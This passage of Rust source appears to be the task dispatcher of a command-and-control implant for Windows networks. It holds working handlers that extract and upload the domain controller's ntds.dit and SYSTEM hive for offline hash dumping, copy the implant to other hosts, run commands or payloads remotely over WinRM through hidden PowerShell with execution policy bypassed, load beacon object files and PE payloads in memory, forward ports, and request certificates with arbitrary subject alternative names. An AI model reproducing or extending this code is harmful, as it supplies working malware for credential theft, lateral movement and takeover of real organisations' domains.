                t.send_result(task.id, &result, "");
            }
            #[cfg(not(target_os = "windows"))]
            t.send_result(task.id, "", "PIPE_START: not supported on this platform");
        }
        "PIPE_STOP" => {
            #[cfg(target_os = "windows")]
            {
                let result = pipe_server::pipe_server_stop(&task.args);
                t.send_result(task.id, &result, "");
            }
            #[cfg(not(target_os = "windows"))]
            t.send_result(task.id, "", "PIPE_STOP: not supported on this platform");
        }
        "BOF_LIST" => {
            t.send_result(task.id,
                "BOF execution supported. Upload a .coff/.o file with 'upload', then run with 'bof <filename>'.\nSupported arg types: z (string), i (int32), s (int16), b (bool/byte), Z (wstring), B (binary blob).",
                "");
        }

        "BOF" => {
            #[cfg(target_os = "windows")]
            {
                let args_obj: serde_json::Value = serde_json::from_str(task.args.as_str())
                    .unwrap_or_default();
                let coff_b64 = args_obj["coff_b64"].as_str().unwrap_or("");
                let args_b64 = args_obj["args_b64"].as_str().unwrap_or("");
                let coff = if !coff_b64.is_empty() {
                    STANDARD.decode(coff_b64).unwrap_or_default()
                } else {
                    // Try store: args = "<name>" (plain string, not JSON)
                    let name = task.args.split_whitespace().next().unwrap_or("").to_string();
                    match bof_store_get(&name) {
                        Some(data) => data,
                        None => {
                            t.send_result(task.id, "", "BOF: missing COFF payload (not in store)");
                            return;
                        }
                    }
                };
                let packed = STANDARD.decode(args_b64).unwrap_or_default();
                match crate::bof::exec_bof(&coff, &packed) {
                    Ok(out) => t.send_result(task.id, &out, ""),
                    Err(e)  => t.send_result(task.id, "", &e),
                }
            }
            #[cfg(not(target_os = "windows"))]
            t.send_result(task.id, "", "BOF not supported on this platform");
        }
        "DCSYNC" => {
            // Extract ntds.dit + SYSTEM via IFM (default) or VSS; upload both for offline parsing.
            // Args JSON: {"mode":"ifm|vss","out":"C:\\Users\\Public\\dcsync_out"}
            // Offline: secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
            let mode    = j["mode"].as_str().unwrap_or("ifm");
            let tmp_dir = j["out"].as_str().unwrap_or(r"C:\Users\Public\dcsync_out");
            let mut ntds_path = format!(r"{}\Active Directory\ntds.dit", tmp_dir);
            let mut sys_path  = format!(r"{}\registry\SYSTEM", tmp_dir);
            let mut dc_err    = String::new();

            if mode == "vss" {
                let vss_out = shell("vssadmin create shadow /for=C: 2>&1");
                let shadow  = vss_out.lines()
                    .find(|l| l.contains("HarddiskVolumeShadowCopy") && l.contains(r"\\?\"))
                    .and_then(|l| l.split_whitespace().find(|t| t.contains(r"\\?\")))
                    .map(|s| s.trim_matches(|c: char| c == '\r' || c == '\n').to_string())
                    .unwrap_or_default();
                if shadow.is_empty() {
                    dc_err = format!("VSS shadow copy failed: {}", vss_out);
                } else {
                    shell(&format!("mkdir \"{}\" 2>&1", tmp_dir));
                    shell(&format!(r#"copy "{}\Windows\NTDS\ntds.dit" "{}\ntds.dit" /Y 2>&1"#, shadow, tmp_dir));
                    shell(&format!(r#"copy "{}\Windows\System32\config\SYSTEM" "{}\SYSTEM" /Y 2>&1"#, shadow, tmp_dir));
                    ntds_path = format!(r"{}\ntds.dit", tmp_dir);
                    sys_path  = format!(r"{}\SYSTEM", tmp_dir);
                }
            } else {
                shell(&format!(r"rmdir /S /Q {} 2>&1", tmp_dir));
                shell(&format!(r#"ntdsutil "ac i ntds" "ifm" "create full {}" q q 2>&1"#, tmp_dir));
            }

            if dc_err.is_empty() {
                for (fp, nm) in [(&ntds_path, "ntds.dit"), (&sys_path, "SYSTEM")] {
                    match std::fs::read(fp) {
                        Ok(data) => t.upload_file(task.id, nm, &data),
                        Err(e) => dc_err.push_str(&format!("read {}: {}; ", fp, e)),
                    }
                }
                shell(&format!(r"rmdir /S /Q {} 2>&1", tmp_dir));
                t.send_result(task.id,
                    "[+] DCSYNC: ntds.dit + SYSTEM uploaded. Run: secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL",
                    &dc_err);
            } else {
                t.send_result(task.id, "", &dc_err);
            }
        }

        "LATERAL" | "JUMP" => {
            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
            let method       = j["method"].as_str().unwrap_or("atexec").to_string();
            let host         = j["host"].as_str().unwrap_or("").to_string();
            let user         = j["user"].as_str().unwrap_or("").to_string();
            let pass         = j["pass"].as_str().unwrap_or("").to_string();
            let cmd          = j["cmd"].as_str().unwrap_or("").to_string();
            let json_local   = j["local_path"].as_str().unwrap_or("").to_string();
            let payload_name = j["payload"].as_str().unwrap_or("").to_string();
            let (data, local_path): (Vec<u8>, String) = if payload_name.eq_ignore_ascii_case("self") {
                let self_path = std::env::current_exe().unwrap_or_default();
                let bytes = std::fs::read(&self_path).unwrap_or_default();
                (bytes, self_path.to_string_lossy().into_owned())
            } else if !task.payload.is_empty() {
                (task.payload.clone(), String::new())
            } else if !payload_name.is_empty() {
                let bytes = t.download_file(&payload_name);
                if bytes.is_empty() {
                    t.send_result(task.id, "", "LATERAL: payload bytes unavailable over this transport");
                    return;
                }
                (bytes, String::new())
            } else if !cmd.is_empty() {
                (std::fs::read(&cmd).unwrap_or_default(), cmd.clone())
            } else if !json_local.is_empty() {
                (vec![], json_local.clone())
            } else {
                (vec![], String::new())
            };
            let effective_cmd = if !local_path.is_empty() { local_path } else { cmd };
            match crate::lateral::run_lateral(&method, &host, &data, &effective_cmd, &user, &pass) {
                Ok(out)  => t.send_result(task.id, &out, ""),
                Err(err) => t.send_result(task.id, "", &err),
            }
        }
        // ── Aliases ───────────────────────────────────────────────────────────────
        "PE_EXEC" => {
            let payload = &task.payload;
            if payload.is_empty() {
                t.send_result(task.id, "", "PE_EXEC requires a PE payload");
                return;
            }
            #[cfg(target_os = "windows")]
            { let r = pe_exec::exec_pe(payload); t.send_result(task.id, &r, ""); }
            #[cfg(not(target_os = "windows"))]
            t.send_result(task.id, "", "PE_EXEC: not supported on this platform");
        }

        // ── Env shortcuts ─────────────────────────────────────────────────────
        "USERPROFILE" | "HOME" => {
            let v = std::env::var("USERPROFILE")
                .or_else(|_| std::env::var("HOME"))
                .unwrap_or_default();
            t.send_result(task.id, &v, "");
        }
        "USERDOMAIN" => {
            let v = std::env::var("USERDOMAIN").unwrap_or_default();
            t.send_result(task.id, &v, "");
        }
        "TEMP" => {
            let v = std::env::var("TEMP")
                .or_else(|_| std::env::var("TMP"))
                .unwrap_or_else(|_| std::env::temp_dir().to_string_lossy().into_owned());
            t.send_result(task.id, &v, "");
        }
        "DISPLAY" => {
            let v = std::env::var("DISPLAY").unwrap_or_else(|_| "(no DISPLAY)".to_string());
            t.send_result(task.id, &v, "");
        }

        // ── Network ───────────────────────────────────────────────────────────
        "NETSTAT" => {
            let out = shell("netstat -ano");
            t.send_result(task.id, &out, "");
        }

        // ── Port forwarding ───────────────────────────────────────────────────
        "PORTFWD_ADD" => {
            // Args: "[tcp|udp] <lport> <rhost> <rport>"
            let parts: Vec<&str> = task.args.split_whitespace().collect();
            let (proto, rest) = if parts.first().map(|p| *p == "tcp" || *p == "udp").unwrap_or(false) {
                (parts[0], &parts[1..])
            } else {
                ("tcp", parts.as_slice())
            };
            if rest.len() < 3 {
                t.send_result(task.id, "", "usage: [tcp|udp] <lport> <rhost> <rport>");
                return;
            }
            let lport = rest[0].parse::<u16>().unwrap_or(0);
            let rport = rest[2].parse::<u16>().unwrap_or(0);
            if lport == 0 || rport == 0 {
                t.send_result(task.id, "", "invalid port numbers");
                return;
            }
            let out = portfwd::portfwd_add(proto, lport, rest[1], rport);
            t.send_result(task.id, &out, "");
        }
        "PORTFWD_DEL" => {
            // Args: "[tcp|udp] <lport>"
            let parts: Vec<&str> = task.args.split_whitespace().collect();
            let (proto, port_str) = if parts.len() == 2 && (parts[0] == "tcp" || parts[0] == "udp") {
                (parts[0], parts[1])
            } else {
                ("tcp", parts.first().copied().unwrap_or("0"))
            };
            let lport = port_str.parse::<u16>().unwrap_or(0);
            if lport == 0 {
                t.send_result(task.id, "", "usage: [tcp|udp] <lport>");
                return;
            }
            let out = portfwd::portfwd_del(proto, lport);
            t.send_result(task.id, &out, "");
        }
        "PORTFWD_LIST" => {
            t.send_result(task.id, &portfwd::portfwd_list(), "");
        }

        // ── WinRM ─────────────────────────────────────────────────────────────
        "WINRM_EXEC" => {
            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
            let target = j["target"].as_str().unwrap_or("");
            let user   = j["user"].as_str().unwrap_or("");
            let pass   = j["pass"].as_str().unwrap_or("");
            let cmd    = j["cmd"].as_str().unwrap_or("");
            if target.is_empty() || cmd.is_empty() {
                t.send_result(task.id, "", "WINRM_EXEC: {\"target\",\"user\",\"pass\",\"cmd\"} required");
                return;
            }
            let trust = format!(
                "Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value * -Force -EA SilentlyContinue;\
                 try{{$ip=([System.Net.Dns]::GetHostAddresses('{target}')|Where-Object{{$_.AddressFamily -ne 23}}|Select-Object -First 1).IPAddressToString}}catch{{$ip='{target}'}};",
                target = target
            );
            let ps = format!(
                "{trust}$c=New-Object PSCredential('{user}',(ConvertTo-SecureString '{pass}' -AsPlainText -Force));\
                 Invoke-Command -ComputerName $ip -Authentication Negotiate -Credential $c -ScriptBlock {{{cmd}}}",
                trust = trust, user = user, pass = pass, cmd = cmd
            );
            let ps_escaped = ps.replace('"', "\\\"");
            let out = shell(&format!("powershell -NoP -W Hidden -Exec Bypass -C \"{}\"", ps_escaped));
            t.send_result(task.id, &out, "");
        }
        "WINRM_DEPLOY" => {
            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
            let target  = j["target"].as_str().unwrap_or("");
            let user    = j["user"].as_str().unwrap_or("");
            let pass    = j["pass"].as_str().unwrap_or("");
            let payload = j["payload"].as_str().unwrap_or("");
            if target.is_empty() || payload.is_empty() {
                t.send_result(task.id, "", "WINRM_DEPLOY: {\"target\",\"user\",\"pass\",\"payload\"} required");
                return;
            }
            let trust = format!(
                "Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value * -Force -EA SilentlyContinue;\
                 try{{$ip=([System.Net.Dns]::GetHostAddresses('{target}')|Where-Object{{$_.AddressFamily -ne 23}}|Select-Object -First 1).IPAddressToString}}catch{{$ip='{target}'}};",
                target = target
            );
            let ps = format!(
                "{trust}$c=New-Object PSCredential('{user}',(ConvertTo-SecureString '{pass}' -AsPlainText -Force));\
                 Invoke-Command -ComputerName $ip -Authentication Negotiate -Credential $c -AsJob -ScriptBlock {{{payload}}} | Out-Null",
                trust = trust, user = user, pass = pass, payload = payload
            );
            let ps_escaped = ps.replace('"', "\\\"");
            let out = shell(&format!("powershell -NoP -W Hidden -Exec Bypass -C \"{}\"", ps_escaped));
            t.send_result(task.id, &out, "");
        }

        // ── BOF store ─────────────────────────────────────────────────────────
        "BOF_STORE_LOAD" => {
            let name = task.args.trim().to_string();
            if name.is_empty() {
                t.send_result(task.id, "", "usage: BOF_STORE_LOAD <name>  (payload=base64 COFF)");
                return;
            }
            let data = STANDARD.decode(&task.payload).unwrap_or_default();
            if data.is_empty() {
                t.send_result(task.id, "", "BOF_STORE_LOAD: empty payload");
                return;
            }
            t.send_result(task.id, &bof_store_load(&name, data), "");
        }
        "BOF_STORE_LIST" => {
            t.send_result(task.id, &bof_store_list(), "");
        }
        "BOF_STORE_UNLOAD" => {
            t.send_result(task.id, &bof_store_unload(task.args.trim()), "");
        }

        // ── Convenience shell commands ────────────────────────────────────────
        "WHOAMI" => {
            t.send_result(task.id, &shell("whoami /all"), "");
        }
        "IPCONFIG" => {
            t.send_result(task.id, &shell("ipconfig /all"), "");
        }
        "USERNAME" | "USER" => {
            let v = std::env::var("USERNAME")
                .or_else(|_| std::env::var("USER"))
                .unwrap_or_default();
            t.send_result(task.id, &v, "");
        }
        "COMPUTERNAME" => {
            let v = std::env::var("COMPUTERNAME").unwrap_or_default();
            t.send_result(task.id, &v, "");
        }

        "ADCS_REQUEST" => {
            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
            let ca   = j["ca"].as_str().unwrap_or("");
            let tmpl = j["template"].as_str().unwrap_or("");
            let subj = j["subject"].as_str().unwrap_or("CN=user");
            let san  = j["san"].as_str().unwrap_or("");
            let out_arg = j["out"].as_str().unwrap_or("");
            let pid  = std::process::id();
            let inf  = format!(r"C:\Users\Public\adcs_{}.inf", pid);
            let csr  = format!(r"C:\Users\Public\adcs_{}.csr", pid);
            let out_path = if out_arg.is_empty() {
                format!(r"C:\Users\Public\adcs_{}.cer", pid)
            } else {
                out_arg.to_string()
            };
            let san_line = if san.is_empty() { String::new() } else { format!("\r\nSAN=upn={}", san) };
            let inf_content = format!(
                "[Version]\r\nSignature=\"$Windows NT$\"\r\n\r\n[NewRequest]\r\nSubject = \"{}\"\r\nKeySpec = 1\r\nKeyLength = 2048\r\nExportable = TRUE\r\nMachineKeySet = FALSE\r\nRequestType = CMC\r\n\r\n[RequestAttributes]\r\nCertificateTemplate={}{}\r\n",
                subj, tmpl, san_line
            );
            let _ = std::fs::write(&inf, inf_content.as_bytes());
            let o1 = shell(&format!("certreq -new \"{}\" \"{}\" 2>&1", inf, csr));
            let o2 = shell(&format!("certreq -submit -config \"{}\" \"{}\" \"{}\" 2>&1", ca, csr, out_path));
            let cert_b64 = std::fs::read(&out_path)
                .map(|b| format!("\ncert_b64={}", STANDARD.encode(&b)))
                .unwrap_or_default();
            let _ = std::fs::remove_file(&inf);
            let _ = std::fs::remove_file(&csr);
            t.send_result(task.id, &format!("{}\n{}{}", o1, o2, cert_b64), "");
        }

        // ── Agent state ───────────────────────────────────────────────────────
        "DETECTED" => {
            t.send_result(task.id, "[!] DETECTED flag acknowledged", "");
        }

        _ => {
            // Delegate to feature modules
            #[cfg(target_os = "windows")]
            if commands_injection::dispatch(t, task) { return; }
            #[cfg(target_os = "windows")]
            if commands_tokens::dispatch(t, task) { return; }
            #[cfg(target_os = "windows")]
            if commands_defense::dispatch(t, task) { return; }
            #[cfg(target_os = "windows")]
            if commands_utils::dispatch(t, task) { return; }
            if commands_ishell::dispatch(t, task)  { return; }
            t.send_result(task.id, "", &format!("unknown task type: {}", task.typ));
        }
    }
}
